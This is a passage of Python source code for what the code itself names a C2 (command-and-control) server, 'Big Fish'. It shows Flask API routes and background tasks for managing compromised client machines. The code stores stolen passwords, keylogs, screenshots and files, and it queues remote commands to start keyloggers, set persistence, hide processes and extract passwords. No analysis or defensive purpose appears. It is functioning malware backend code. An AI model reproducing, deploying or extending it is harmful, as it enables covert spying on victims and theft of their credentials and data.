                    ORDER BY timestamp DESC
                    LIMIT 20""", (client_id,))
        
        screenshots = []
        for row in c.fetchall():
            screenshots.append({
                'id': row['id'],
                'timestamp': row['timestamp'],
                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M'),
                'filepath': row['filepath'],
                'dimensions': f"{row['width']}x{row['height']}" if row['width'] else 'Unknown',
                'size': format_size(row['size']),
                'url': f"/api/screenshot/view/{row['id']}"
            })
        
        conn.close()
        return jsonify({'screenshots': screenshots})
        
    except Exception as e:
        logger.error(f"[✗] Get screenshots error: {e}")
        return jsonify({'screenshots': []})

@app.route('/api/screenshot/view/<screenshot_id>', methods=['GET'])
def view_screenshot(screenshot_id):
    """View screenshot"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute('SELECT filepath FROM screenshots WHERE id = ?', (screenshot_id,))
        screenshot = c.fetchone()
        conn.close()
        
        if not screenshot or not os.path.exists(screenshot['filepath']):
            return jsonify({'error': 'Screenshot not found'}), 404
        
        return send_file(screenshot['filepath'], mimetype='image/png')
        
    except Exception as e:
        logger.error(f"[✗] View screenshot error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_system_stats():
    """Get system statistics"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Basic stats
        c.execute('SELECT COUNT(*) FROM clients')
        total_clients = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        online_now = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM files')
        total_files = c.fetchone()[0]
        
        c.execute('SELECT SUM(filesize) FROM files')
        total_size = c.fetchone()[0] or 0
        
        c.execute('SELECT COUNT(*) FROM keylogs')
        total_keylogs = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM passwords')
        total_passwords = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM executables')
        total_executables = c.fetchone()[0]
        
        # OS distribution
        c.execute("""SELECT os, COUNT(*) as count FROM clients GROUP BY os""")
        os_dist = {row['os']: row['count'] for row in c.fetchall()}
        
        # Recent activity
        c.execute("""SELECT COUNT(*) FROM commands 
                    WHERE created_at > ?""", (current_time - 3600,))
        hourly_commands = c.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_now': online_now,
            'total_files': total_files,
            'total_size': total_size,
            'total_size_str': format_size(total_size),
            'total_keylogs': total_keylogs,
            'total_passwords': total_passwords,
            'total_executables': total_executables,
            'os_distribution': os_dist,
            'hourly_commands': hourly_commands,
            'server_time': datetime.now().isoformat(),
            'folders': {
                'downloads': DOWNLOAD_FOLDER,
                'executables': EXECUTABLES_FOLDER,
                'screenshots': SCREENSHOTS_FOLDER
            }
        })
        
    except Exception as e:
        logger.error(f"[✗] Stats error: {e}")
        return jsonify({'error': str(e)})

@app.route('/api/client/control', methods=['POST'])
def client_control():
    """Control client settings (keylogger, stealth, etc.)"""
    try:
        data = request.json
        client_id = data.get('client_id')
        action = data.get('action')
        value = data.get('value', True)
        
        if not client_id or not action:
            return jsonify({'error': 'Missing parameters'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Update client settings
        if action == 'keylogger':
            c.execute("UPDATE clients SET keylogger_active = ? WHERE id = ?", 
                     (1 if value else 0, client_id))
            command = f"keylogger {'start' if value else 'stop'}"
            
        elif action == 'persistence':
            c.execute("UPDATE clients SET persistence_set = ? WHERE id = ?", 
                     (1 if value else 0, client_id))
            command = f"persistence {'enable' if value else 'disable'}"
            
        elif action == 'stealth':
            c.execute("UPDATE clients SET process_hidden = ? WHERE id = ?", 
                     (1 if value else 0, client_id))
            command = f"stealth {'enable' if value else 'disable'}"
            
        elif action == 'screenshot':
            command = "screenshot"
            value = True
            
        elif action == 'extract_passwords':
            command = "extract_passwords"
            value = True
            
        else:
            conn.close()
            return jsonify({'error': 'Invalid action'}), 400
        
        # Send command to client
        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands 
                    (id, client_id, command, command_type, status, created_at, priority)
                    VALUES (?, ?, ?, 'control', 'pending', ?, 10)""",
                 (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': f'Control command sent: {action}'
        })
        
    except Exception as e:
        logger.error(f"[✗] Client control error: {e}")
        return jsonify({'error': str(e)}), 500

def get_online_count():
    """Get count of online clients"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def format_size(size_bytes):
    """Format file size"""
    if size_bytes == 0:
        return "0B"
    
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024
        i += 1
    
    return f"{size_bytes:.2f} {size_names[i]}"

# WebSocket events
@socketio.on('connect')
def handle_connect():
    logger.info(f"[✓] Client connected: {request.sid}")
    emit('connected', {'message': 'Connected to C2 server'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"[✓] Client disconnected: {request.sid}")

@socketio.on('client_update')
def handle_client_update(data):
    """Broadcast client updates to all connected consoles"""
    emit('client_update', data, broadcast=True)

@socketio.on('command_update')
def handle_command_update(data):
    """Broadcast command updates"""
    emit('command_update', data, broadcast=True)

# Background tasks
def cleanup_old_data():
    """Clean up old data"""
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            current_time = time.time()
            
            # Clean old completed commands (older than 7 days)
            cutoff = current_time - (7 * 24 * 3600)
            c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
            
            # Clean old keylogs (older than 30 days)
            cutoff = current_time - (30 * 24 * 3600)
            c.execute("DELETE FROM keylogs WHERE timestamp < ?", (cutoff,))
            
            conn.commit()
            conn.close()
            
            logger.info("[✓] Cleanup completed")
            
        except Exception as e:
            logger.error(f"[✗] Cleanup error: {e}")
        
        time.sleep(3600)  # Run every hour

def update_client_status():
    """Update client status periodically"""
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            current_time = time.time()
            
            # Mark clients as offline
            c.execute("UPDATE clients SET status = 'offline' WHERE ? - last_seen > ?",
                     (current_time, ONLINE_THRESHOLD))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"[✗] Status update error: {e}")
        
        time.sleep(60)  # Run every minute

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 5000))
    
    # Start background threads
    threading.Thread(target=cleanup_old_data, daemon=True).start()
    threading.Thread(target=update_client_status, daemon=True).start()
    
    logger.info(f"[✓] Big Fish C2 Server starting on port {PORT}")
    logger.info(f"[✓] Encryption key: {ENCRYPTION_KEY[:20]}...")
    logger.info(f"[✓] Download folder: {os.path.abspath(DOWNLOAD_FOLDER)}")
    
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
